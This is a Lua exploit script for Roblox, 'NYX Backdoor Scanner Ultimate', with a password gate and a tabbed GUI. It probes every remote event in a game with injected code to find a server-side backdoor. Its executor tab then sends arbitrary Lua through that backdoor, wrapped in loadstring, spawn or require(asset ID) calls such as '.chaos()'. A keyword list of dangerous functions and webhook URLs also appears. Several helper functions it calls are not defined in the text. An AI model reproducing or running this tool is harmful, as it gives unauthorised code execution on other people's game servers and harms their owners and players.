-- Alpha build, Encrypted

--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  SCANNER
]=]

-- ============================================================================
-- Dont Cut It, SKid
-- ============================================================================

local PASSWORD_CODES = {35, 35, 35, 35, 95, 48, 57, 88, 120, 95, 52, 57, 57, 48, 48, 102, 108, 83, 95, 71, 103, 84, 33, 53, 54, 33, 33, 37, 38}
local function getPassword()
    local chars = {}
    for _, code in ipairs(PASSWORD_CODES) do
        table.insert(chars, string.char(code))
    end
    return table.concat(chars)
end
local PASSWORD = getPassword()

-- Создаём окно ввода пароля
local player = game.Players.LocalPlayer
local passGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
passGui.Name = "NyxPassPrompt"
passGui.ResetOnSpawn = false
passGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local passFrame = Instance.new("Frame", passGui)
passFrame.Size = UDim2.new(0, 300, 0, 120)
passFrame.Position = UDim2.new(0.5, -150, 0.5, -60)
passFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
passFrame.BorderSizePixel = 0

local passStroke = Instance.new("UIStroke", passFrame)
passStroke.Color = Color3.fromRGB(0, 255, 0)
passStroke.Thickness = 1

local passCorner = Instance.new("UICorner", passFrame)
passCorner.CornerRadius = UDim.new(0, 6)

local passTitle = Instance.new("TextLabel", passFrame)
passTitle.Size = UDim2.new(1, 0, 0, 30)
passTitle.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
passTitle.Text = "NYX SCANNER - ENTER PASSWORD"
passTitle.TextColor3 = Color3.fromRGB(0, 255, 0)
passTitle.Font = Enum.Font.Code
passTitle.TextSize = 14

local passBox = Instance.new("TextBox", passFrame)
passBox.Size = UDim2.new(1, -20, 0, 30)
passBox.Position = UDim2.new(0, 10, 0, 40)
passBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
passBox.TextColor3 = Color3.fromRGB(0, 255, 0)
passBox.Font = Enum.Font.Code
passBox.TextSize = 14
passBox.PlaceholderText = "Enter password..."
passBox.Text = ""

local passBoxCorner = Instance.new("UICorner", passBox)
passBoxCorner.CornerRadius = UDim.new(0, 4)

local passBtn = Instance.new("TextButton", passFrame)
passBtn.Size = UDim2.new(1, -20, 0, 30)
passBtn.Position = UDim2.new(0, 10, 0, 80)
passBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
passBtn.Text = "UNLOCK"
passBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
passBtn.Font = Enum.Font.Code
passBtn.TextSize = 14

local passBtnCorner = Instance.new("UICorner", passBtn)
passBtnCorner.CornerRadius = UDim.new(0, 4)

local attempts = 0
local function loadMainGUI()
    passGui:Destroy()
    loadScanner()
end

passBtn.MouseButton1Click:Connect(function()
    if passBox.Text == PASSWORD then
        loadMainGUI()
    else
        attempts = attempts + 1
        if attempts >= 3 then
            player:Kick("NYX SCANNER - Too many failed attempts.")
        else
            passBox.Text = ""
            passBox.PlaceholderText = "Wrong! " .. (3 - attempts) .. " tries left..."
        end
    end
end)

passBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        if passBox.Text == PASSWORD then
            loadMainGUI()
        else
            attempts = attempts + 1
            if attempts >= 3 then
                player:Kick("NYX SCANNER - Too many failed attempts.")
            else
                passBox.Text = ""
                passBox.PlaceholderText = "Wrong! " .. (3 - attempts) .. " tries left..."
            end
        end
    end
end)

-- Drag для окна пароля
local UIS = game:GetService("UserInputService")
local dragToggle, dragStart, startPos

passTitle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = true
        dragStart = input.Position
        startPos = passFrame.Position
    end
end)
passTitle.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = false
    end
end)
UIS.InputChanged:Connect(function(input)
    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        passFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ============================================================================
-- ОСНОВНОЙ GUI (загружается после правильного пароля)
-- ============================================================================

function loadScanner()
-- Instances
local G2L = {};

-- StarterGui.NYX Scanner
G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
G2L["1"]["Name"] = [[NYX Scanner]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;

-- StarterGui.NYX Scanner.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Size"] = UDim2.new(0, 500, 0, 320);
G2L["2"]["Position"] = UDim2.new(0.27, 0, 0.3, 0);

-- UIStroke
G2L["3"] = Instance.new("UIStroke", G2L["2"]);
G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);

-- UIGradient
G2L["4"] = Instance.new("UIGradient", G2L["3"]);
G2L["4"]["Rotation"] = 50;
G2L["4"]["Color"] = ColorSequence.new{
    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(0, 255, 0)),
    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(0, 255, 200))
};

-- UICorner
G2L["5"] = Instance.new("UICorner", G2L["2"]);

-- Вкладки
G2L["tabFrame"] = Instance.new("Frame", G2L["2"]);
G2L["tabFrame"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["tabFrame"]["Position"] = UDim2.new(0, 0, 0, 0);
G2L["tabFrame"]["BackgroundColor3"] = Color3.fromRGB(10, 10, 10);
G2L["tabFrame"]["BorderSizePixel"] = 0;

-- Вкладка Scanner
G2L["scanTab"] = Instance.new("TextButton", G2L["tabFrame"]);
G2L["scanTab"]["Size"] = UDim2.new(0, 125, 1, 0);
G2L["scanTab"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
G2L["scanTab"]["Text"] = "SCANNER";
G2L["scanTab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["scanTab"]["Font"] = Enum.Font.Code;
G2L["scanTab"]["TextSize"] = 12;

-- Вкладка Source
G2L["sourceTab"] = Instance.new("TextButton", G2L["tabFrame"]);
G2L["sourceTab"]["Size"] = UDim2.new(0, 125, 1, 0);
G2L["sourceTab"]["Position"] = UDim2.new(0, 125, 0, 0);
G2L["sourceTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
G2L["sourceTab"]["Text"] = "SOURCE";
G2L["sourceTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
G2L["sourceTab"]["Font"] = Enum.Font.Code;
G2L["sourceTab"]["TextSize"] = 12;

-- Вкладка Executor
G2L["execTab"] = Instance.new("TextButton", G2L["tabFrame"]);
G2L["execTab"]["Size"] = UDim2.new(0, 125, 1, 0);
G2L["execTab"]["Position"] = UDim2.new(0, 250, 0, 0);
G2L["execTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
G2L["execTab"]["Text"] = "EXECUTOR";
G2L["execTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
G2L["execTab"]["Font"] = Enum.Font.Code;
G2L["execTab"]["TextSize"] = 12;

-- Вкладка Logs
G2L["logsTab"] = Instance.new("TextButton", G2L["tabFrame"]);
G2L["logsTab"]["Size"] = UDim2.new(0, 125, 1, 0);
G2L["logsTab"]["Position"] = UDim2.new(0, 375, 0, 0);
G2L["logsTab"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
G2L["logsTab"]["Text"] = "LOGS";
G2L["logsTab"]["TextColor3"] = Color3.fromRGB(150, 150, 150);
G2L["logsTab"]["Font"] = Enum.Font.Code;
G2L["logsTab"]["TextSize"] = 12;

-- Контент
G2L["content"] = Instance.new("Frame", G2L["2"]);
G2L["content"]["Size"] = UDim2.new(1, -20, 0, 230);
G2L["content"]["Position"] = UDim2.new(0, 10, 0, 40);
G2L["content"]["BackgroundTransparency"] = 1;
 
-- ============================================================================
-- SCANNER FRAME
-- ============================================================================
G2L["scannerFrame"] = Instance.new("Frame", G2L["content"]);
G2L["scannerFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["scannerFrame"]["BackgroundTransparency"] = 1;

G2L["scanBtn"] = Instance.new("TextButton", G2L["scannerFrame"]);
G2L["scanBtn"]["Size"] = UDim2.new(0, 200, 0, 40);
G2L["scanBtn"]["Position"] = UDim2.new(0.5, -100, 0, 20);
G2L["scanBtn"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
G2L["scanBtn"]["Text"] = "START SCANNING";
G2L["scanBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["scanBtn"]["Font"] = Enum.Font.Code;
G2L["scanBtn"]["TextSize"] = 16;

G2L["scanStatus"] = Instance.new("TextLabel", G2L["scannerFrame"]);
G2L["scanStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["scanStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
G2L["scanStatus"]["BackgroundTransparency"] = 1;
G2L["scanStatus"]["Text"] = "Ready. Press START SCANNING.";
G2L["scanStatus"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
G2L["scanStatus"]["Font"] = Enum.Font.Code;
G2L["scanStatus"]["TextSize"] = 12;
G2L["scanStatus"]["TextXAlignment"] = Enum.TextXAlignment.Center;

-- ============================================================================
-- SOURCE FRAME
-- ============================================================================
G2L["sourceFrame"] = Instance.new("Frame", G2L["content"]);
G2L["sourceFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["sourceFrame"]["BackgroundTransparency"] = 1;
G2L["sourceFrame"]["Visible"] = false;

G2L["sourceBtn"] = Instance.new("TextButton", G2L["sourceFrame"]);
G2L["sourceBtn"]["Size"] = UDim2.new(0, 200, 0, 40);
G2L["sourceBtn"]["Position"] = UDim2.new(0.5, -100, 0, 20);
G2L["sourceBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 100);
G2L["sourceBtn"]["Text"] = "ANALYZE SOURCE";
G2L["sourceBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["sourceBtn"]["Font"] = Enum.Font.Code;
G2L["sourceBtn"]["TextSize"] = 16;

G2L["sourceStatus"] = Instance.new("TextLabel", G2L["sourceFrame"]);
G2L["sourceStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["sourceStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
G2L["sourceStatus"]["BackgroundTransparency"] = 1;
G2L["sourceStatus"]["Text"] = "Ready. Press ANALYZE SOURCE.";
G2L["sourceStatus"]["TextColor3"] = Color3.fromRGB(255, 150, 0);
G2L["sourceStatus"]["Font"] = Enum.Font.Code;
G2L["sourceStatus"]["TextSize"] = 12;
G2L["sourceStatus"]["TextXAlignment"] = Enum.TextXAlignment.Center;

-- ============================================================================
-- EXECUTOR FRAME
-- ============================================================================
G2L["executorFrame"] = Instance.new("Frame", G2L["content"]);
G2L["executorFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["executorFrame"]["BackgroundTransparency"] = 1;
G2L["executorFrame"]["Visible"] = false;

G2L["scriptBox"] = Instance.new("TextBox", G2L["executorFrame"]);
G2L["scriptBox"]["Size"] = UDim2.new(1, 0, 0, 150);
G2L["scriptBox"]["BackgroundColor3"] = Color3.fromRGB(20, 20, 20);
G2L["scriptBox"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
G2L["scriptBox"]["Font"] = Enum.Font.Code;
G2L["scriptBox"]["TextSize"] = 13;
G2L["scriptBox"]["MultiLine"] = true;
G2L["scriptBox"]["Text"] = "";
G2L["scriptBox"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["scriptBox"]["TextYAlignment"] = Enum.TextYAlignment.Top;

G2L["execBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
G2L["execBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
G2L["execBtn"]["Position"] = UDim2.new(0, 0, 0, 160);
G2L["execBtn"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0);
G2L["execBtn"]["Text"] = "EXECUTE";
G2L["execBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["execBtn"]["Font"] = Enum.Font.Code;
G2L["execBtn"]["TextSize"] = 14;

G2L["copyBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
G2L["copyBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
G2L["copyBtn"]["Position"] = UDim2.new(0, 160, 0, 160);
G2L["copyBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 100, 0);
G2L["copyBtn"]["Text"] = "COPY";
G2L["copyBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["copyBtn"]["Font"] = Enum.Font.Code;
G2L["copyBtn"]["TextSize"] = 14;

G2L["clearBtn"] = Instance.new("TextButton", G2L["executorFrame"]);
G2L["clearBtn"]["Size"] = UDim2.new(0, 150, 0, 30);
G2L["clearBtn"]["Position"] = UDim2.new(0, 320, 0, 160);
G2L["clearBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 0);
G2L["clearBtn"]["Text"] = "CLEAR";
G2L["clearBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["clearBtn"]["Font"] = Enum.Font.Code;
G2L["clearBtn"]["TextSize"] = 14;

G2L["execStatus"] = Instance.new("TextLabel", G2L["executorFrame"]);
G2L["execStatus"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["execStatus"]["Position"] = UDim2.new(0, 0, 1, -30);
G2L["execStatus"]["BackgroundTransparency"] = 1;
G2L["execStatus"]["Text"] = "";
G2L["execStatus"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
G2L["execStatus"]["Font"] = Enum.Font.Code;
G2L["execStatus"]["TextSize"] = 12;

--Idk
warn("This can be copy of original Nyx Scanner! Be Careful")
 
-- ============================================================================
-- LOGS FRAME
-- ============================================================================
G2L["logsFrame"] = Instance.new("Frame", G2L["content"]);
G2L["logsFrame"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["logsFrame"]["BackgroundTransparency"] = 1;
G2L["logsFrame"]["Visible"] = false;

G2L["logsBox"] = Instance.new("TextBox", G2L["logsFrame"]);
G2L["logsBox"]["Size"] = UDim2.new(1, 0, 0, 190);
G2L["logsBox"]["BackgroundColor3"] = Color3.fromRGB(15, 15, 15);
G2L["logsBox"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
G2L["logsBox"]["Font"] = Enum.Font.Code;
G2L["logsBox"]["TextSize"] = 11;
G2L["logsBox"]["MultiLine"] = true;
G2L["logsBox"]["Text"] = "=== NYX SCANNER LOGS ===\n\n";
G2L["logsBox"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["logsBox"]["TextYAlignment"] = Enum.TextYAlignment.Top;

G2L["clearLogsBtn"] = Instance.new("TextButton", G2L["logsFrame"]);
G2L["clearLogsBtn"]["Size"] = UDim2.new(0, 100, 0, 25);
G2L["clearLogsBtn"]["Position"] = UDim2.new(1, -100, 0, 200);
G2L["clearLogsBtn"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 0);
G2L["clearLogsBtn"]["Text"] = "CLEAR";
G2L["clearLogsBtn"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["clearLogsBtn"]["Font"] = Enum.Font.Code;
G2L["clearLogsBtn"]["TextSize"] = 11;

-- Title
G2L["title"] = Instance.new("TextLabel", G2L["2"]);
G2L["title"]["Size"] = UDim2.new(1, 0, 0, 30);
G2L["title"]["Position"] = UDim2.new(0, 0, 1, -30);
G2L["title"]["BackgroundTransparency"] = 1;
G2L["title"]["Text"] = "NYX BACKDOOR SCANNER ULTIMATE";
G2L["title"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
G2L["title"]["Font"] = Enum.Font.Code;
G2L["title"]["TextSize"] = 12;
G2L["title"]["TextXAlignment"] = Enum.TextXAlignment.Center;

-- Close button
G2L["close"] = Instance.new("TextButton", G2L["2"]);
G2L["close"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["close"]["Position"] = UDim2.new(1, -30, 0, 0);
G2L["close"]["BackgroundColor3"] = Color3.fromRGB(200, 50, 50);
G2L["close"]["Text"] = "X";
G2L["close"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["close"]["Font"] = Enum.Font.Code;
G2L["close"]["TextSize"] = 16;
G2L["close"]["MouseButton1Click"]:Connect(function() G2L["1"]:Destroy() end);

-- Dragify (ИСПРАВЛЕНО)
local UIS = game:GetService("UserInputService")
local dragToggle = false
local dragStart = nil
local startPos = nil
local main = G2L["2"]

-- Создаём прозрачную панель для перетаскивания поверх вкладок
local dragBar = Instance.new("Frame", main)
dragBar.Size = UDim2.new(1, 0, 0, 30)
dragBar.Position = UDim2.new(0, 0, 0, 0)
dragBar.BackgroundTransparency = 1
dragBar.Name = "DragBar"
dragBar.ZIndex = 10 -- Поверх остальных элементов

dragBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

dragBar.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragToggle = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

-- ============================================================================
-- ЛОГИКА
-- ============================================================================
local function runRemote(remote, data)
    -- Если data - число, отправляем как require(ID)
    if tonumber(data) then
        local id = tonumber(data)
        local commands = {
            "require(" .. id .. ").loadAll()",
            "require(" .. id .. ").chaos()",
            "require(" .. id .. ").Fire()",
            "require(" .. id .. ")"
        }
        for _, cmd in ipairs(commands) do
            pcall(function()
                if remote:IsA('RemoteEvent') then
                    remote:FireServer(cmd)
                else
                    remote:InvokeServer(cmd)
                end
            end)
        end
        return
    end
    
    -- Если data - строка
    if type(data) == "string" then
        -- 1. Сначала пробуем прямой код (как в оригинале)
        pcall(function()
            if remote:IsA('RemoteEvent') then
                remote:FireServer(data)
            else
                remote:InvokeServer(data)
            end
        end)
        
        -- 2. Пробуем loadstring (для Lua-кода)
        local loadstringWrapped = "loadstring('" .. data:gsub("'", "\\'") .. "')()"
        pcall(function()
            if remote:IsA('RemoteEvent') then
                remote:FireServer(loadstringWrapped)
            else
                remote:InvokeServer(loadstringWrapped)
            end
        end)
        
        -- 3. Пробуем spawn (для асинхронного выполнения)
        local spawnWrapped = "spawn(function() " .. data .. " end)"
        pcall(function()
            if remote:IsA('RemoteEvent') then
                remote:FireServer(spawnWrapped)
            else
                remote:InvokeServer(spawnWrapped)
            end
        end)
        return
    end
    
    -- Стандартное поведение для других типов данных
    if remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote:IsA('RemoteFunction') then
        spawn(function() remote:InvokeServer(data) end)
    end
end

-- Сканер бэкдоров
local function findRemote()
    local timee = os.clock()
    local remotes = {}
    
    for _, remote in ipairs(game:GetDescendants()) do
        if remote:IsA('RemoteEvent') or remote:IsA('RemoteFunction') then
            if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then continue end
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then continue end
            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' then continue end
            if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then continue end
            
            local code = generateName(math.random(12, 30))
            while remotes[code] do code = generateName(math.random(12, 30)) end
            
            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
            remotes[code] = remote
        end
    end
    
    for i = 1, 100 do
        for code, remote in pairs(remotes) do
            if workspace:FindFirstChild(code) then
                backdoor = remote
                notify("Backdoor found! " .. remote:GetFullName())
                addLog("Backdoor found: " .. remote:GetFullName())
                return true
            end
        end
        wait()
    end
    
    return false
end

-- Source Scan
local function sourceScan()
    local found = {}
    local dangerous = {"require", "loadstring", "getfenv", "setfenv", "http_request", "syn.request", "HttpService", "webhook", "discord.com/api"}
    
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("LuaSourceContainer") then
            local src = v.Source
            for id in string.gmatch(src, "require%s*%(%s*(%d+)%s*%)") do
                table.insert(found, v:GetFullName() .. " -> require(" .. id .. ")")
            end
            for _, fn in ipairs(dangerous) do
                if string.find(src, fn) then
                    table.insert(found, v:GetFullName() .. " -> " .. fn)
                end
            end
        end
    end
    
    if #found > 0 then
        print("========== SOURCE SCAN RESULTS ==========")
        for i, v in ipairs(found) do print(i .. ". " .. v) end
        print("=========================================")
        notify("Found " .. #found .. " suspicious patterns!")
        addLog("Source scan: " .. #found .. " patterns found")
    else
        notify("No suspicious code found.")
        addLog("Source scan: clean")
    end
end

-- Переключение вкладок
local tabs = {
    {btn = G2L["scanTab"], frame = G2L["scannerFrame"]},
    {btn = G2L["sourceTab"], frame = G2L["sourceFrame"]},
    {btn = G2L["execTab"], frame = G2L["executorFrame"]},
    {btn = G2L["logsTab"], frame = G2L["logsFrame"]}
}

for _, tab in ipairs(tabs) do
    tab.btn.MouseButton1Click:Connect(function()
        for _, t in ipairs(tabs) do
            t.frame.Visible = false
            t.btn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
            t.btn.TextColor3 = Color3.fromRGB(150, 150, 150)
        end
        tab.frame.Visible = true
        tab.btn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
        tab.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end)
end
 
 --Idk
warn("This can be copy of original Nyx Scanner! Be Careful")
 
-- Кнопки
G2L["scanBtn"].MouseButton1Click:Connect(function()
    if searching then return end
    searching = true
    G2L["scanBtn"].Text = "SCANNING..."
    G2L["scanStatus"].Text = "Scanning for backdoors..."
    addLog("Scan started")
    
    if findRemote() then
        G2L["scanStatus"].Text = "Backdoor found! Go to EXECUTOR tab."
        G2L["scanBtn"].Text = "FOUND!"
    else
        G2L["scanStatus"].Text = "No backdoor found :("
        G2L["scanBtn"].Text = "NO BACKDOOR"
        addLog("Scan: no backdoor found")
    end
    searching = false
end)

G2L["sourceBtn"].MouseButton1Click:Connect(function()
    G2L["sourceStatus"].Text = "Analyzing source code..."
    sourceScan()
    G2L["sourceStatus"].Text = "Done. Check console (F9)."
end)

G2L["execBtn"].MouseButton1Click:Connect(function()
    local code = G2L["scriptBox"].Text
    if code == "" then
        G2L["execStatus"].Text = "No script!"
        return
    end
    
    code = string.gsub(code, "%%username%%", player.Name)
    
    if backdoor then
        runRemote(backdoor, code)
        G2L["execStatus"].Text = "Executed!"
        addLog("Script executed")
    else
        G2L["execStatus"].Text = "No backdoor! Scan first."
    end
end)

G2L["copyBtn"].MouseButton1Click:Connect(function()
    if G2L["scriptBox"].Text ~= "" then
        print("========== COPY THIS ==========")
        print(G2L["scriptBox"].Text)
        print("===============================")
        G2L["execStatus"].Text = "Copied to F9!"
    end
end)

G2L["clearBtn"].MouseButton1Click:Connect(function()
    G2L["scriptBox"].Text = ""
    G2L["execStatus"].Text = "Cleared."
end)

G2L["clearLogsBtn"].MouseButton1Click:Connect(function()
    G2L["logsBox"].Text = "=== NYX SCANNER LOGS ===\n\n"
end)

-- Init
addLog("NYX Scanner loaded")
addLog("Game: " .. game.PlaceId)
addLog("Player: " .. player.Name)
notify("NYX Scanner Ultimate loaded!")
warn("This can be copy of original Nyx Scanner! Be Careful")
print("========================================")
print("NYX BACKDOOR SCANNER ULTIMATE LOADED!")
print("========================================")

end -- Конец loadScanner()
